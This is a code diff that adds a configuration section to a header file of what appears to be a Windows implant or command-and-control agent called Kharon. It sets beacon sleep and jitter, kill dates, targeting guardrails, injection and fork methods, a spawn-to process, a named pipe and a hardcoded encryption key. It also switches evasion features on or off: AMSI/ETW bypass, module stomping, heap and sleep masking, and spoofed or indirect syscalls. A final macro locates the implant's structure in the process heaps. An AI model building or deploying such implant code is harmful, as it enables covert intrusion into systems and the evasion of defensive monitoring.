@@ -136,4 +136,151 @@
 #define TUNNEL_MODE_SEND_UDP 1
 #define TUNNEL_MODE_REVERSE_TCP 2
 
+/* ========= [ Config ] ========= */
+
+#define KH_JOB_TERMINATE  0x010
+#define KH_JOB_READY_SEND 0x050
+#define KH_JOB_SUSPENDED  0x100
+#define KH_JOB_HIBERN     0x150
+#define KH_JOB_RUNNING    0x200
+#define KH_JOB_PRE_START  0x300
+
+#ifndef KH_GUARDRAILS_USER
+#define KH_GUARDRAILS_USER nullptr
+#endif // KH_GUARDRAILS_USER
+
+#ifndef KH_GUARDRAILS_HOST
+#define KH_GUARDRAILS_HOST nullptr
+#endif // KH_GUARDRAILS_HOST
+
+#ifndef KH_GUARDRAILS_IPADDRESS 
+#define KH_GUARDRAILS_IPADDRESS nullptr
+#endif // KH_GUARDRAILS_IPADDRESS
+
+#ifndef KH_GUARDRAILS_DOMAIN
+#define KH_GUARDRAILS_DOMAIN nullptr
+#endif // KH_GUARDRAILS_DOMAIN
+
+#ifndef KH_WORKTIME_ENABLED
+#define KH_WORKTIME_ENABLED 0
+#endif // KH_WORKTIME_ENABLED
+
+#ifndef KH_WORKTIME_START_HOUR
+#define KH_WORKTIME_START_HOUR 0
+#endif // KH_WORKTIME_HOUR
+
+#ifndef KH_WORKTIME_START_MIN
+#define KH_WORKTIME_START_MIN 0
+#endif // KH_WORKTIME_MIN
+
+#ifndef KH_WORKTIME_END_HOUR
+#define KH_WORKTIME_END_HOUR 0
+#endif // KH_WORKTIME_END_HOUR
+
+#ifndef KH_WORKTIME_END_MIN
+#define KH_WORKTIME_END_MIN 0
+#endif // KH_WORKTIME_END_MIN
+
+#ifndef KH_KILLDATE_DAY
+#define KH_KILLDATE_DAY 0
+#endif // KH_KILLDATE_DAY
+
+#ifndef KH_KILLDATE_MONTH
+#define KH_KILLDATE_MONTH 0
+#endif // KH_KILLDATE_MONTH
+
+#ifndef KH_KILLDATE_YEAR
+#define KH_KILLDATE_YEAR 0
+#endif // KH_KILLDATE_YEAR
+
+#define KH_CHUNK_SIZE 512000 // 512 KB
+
+#define KH_METHOD_INLINE 0x15
+#define KH_METHOD_FORK   0x20
+
+#define KH_INJECT_EXPLICIT 0x100
+#define KH_INJECT_SPAWN    0x200
+
+#ifndef KH_AGENT_UUID
+#define KH_AGENT_UUID "f47ac10b-58cc-4372-a567-0e02b2c3d479"
+#endif // KH_AGENT_UUID
+
+#ifndef KH_SLEEP_TIME
+#define KH_SLEEP_TIME 3
+#endif // KH_SLEEP_TIME
+
+#ifndef KH_JITTER
+#define KH_JITTER 0
+#endif // KH_JITTER
+
+#ifndef KH_AMSI_ETW_BYPASS
+#define KH_AMSI_ETW_BYPASS 0
+#endif // KH_AMSI_ETW_BYPASS
+
+#ifndef KH_BOF_HOOK_ENABLED
+#define KH_BOF_HOOK_ENABLED FALSE
+#endif // KH_BOF_HOOK_ENALED
+
+#ifndef KH_KILLDATE_ENABLED
+#define KH_KILLDATE_ENABLED FALSE
+#endif // KH_KILLDATE_ENABLED
+
+#ifndef KH_STOMP_MODULE
+#define KH_STOMP_MODULE L"chakra.dll"
+#endif 
+
+#ifndef KH_INJECTION_ID
+#define KH_INJECTION_ID INJECTION_STANDARD
+#endif
+
+#ifndef KH_SPAWNTO_X64
+#define KH_SPAWNTO_X64 L"C:\\Windows\\System32\\notepad.exe"
+#endif // KH_SPAWNTO_X64
+
+#ifndef KH_FORK_PIPE_NAME
+#define KH_FORK_PIPE_NAME "\\\\.\\pipe\\kharon_pipe"
+#endif // KH_FORK_PIPE_NAME
+
+#ifndef KH_CRYPT_KEY
+#define KH_CRYPT_KEY { 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50 }
+#endif
+
+#ifndef KH_HEAP_MASK
+#define KH_HEAP_MASK FALSE
+#endif // KH_HEAP_MASK
+
+#ifndef KH_SYSCALL
+#define KH_SYSCALL 0
+#endif // KH_SYSCALL
+
+#ifndef KH_CHUNKSIZE
+#define KH_CHUNKSIZE 0x500000 //5Mb
+#endif // KH_CHUNKSIZE
+
+#ifndef KH_SLEEP_MASK
+#define KH_SLEEP_MASK eMask::Timer
+#endif // KH_SLEEP_MASK
+
+#define x64_OPCODE_RET			0xC3
+#define x64_OPCODE_MOV			0xB8
+#define	x64_SYSCALL_STUB_SIZE   0x20
+
+#define SYSCALL_NONE            0
+#define SYSCALL_SPOOF           1
+#define SYSCALL_SPOOF_INDIRECT  2
+
+#define KHARON_HEAP_MAGIC 0x545152545889
+
+#define G_KHARON Root::Kharon* Self = []() -> Root::Kharon* { \
+    PEB* peb = NtCurrentPeb(); \
+    for (ULONG i = 0; i < peb->NumberOfHeaps; i++) { \
+        Root::Kharon* potentialKharon = reinterpret_cast<Root::Kharon*>(peb->ProcessHeaps[i]); \
+        if (potentialKharon && potentialKharon->MagicValue == KHARON_HEAP_MAGIC) { \
+            return potentialKharon; \
+        } \
+    } \
+    return nullptr; \
+}();
+
+
 #endif // DEFINES_H
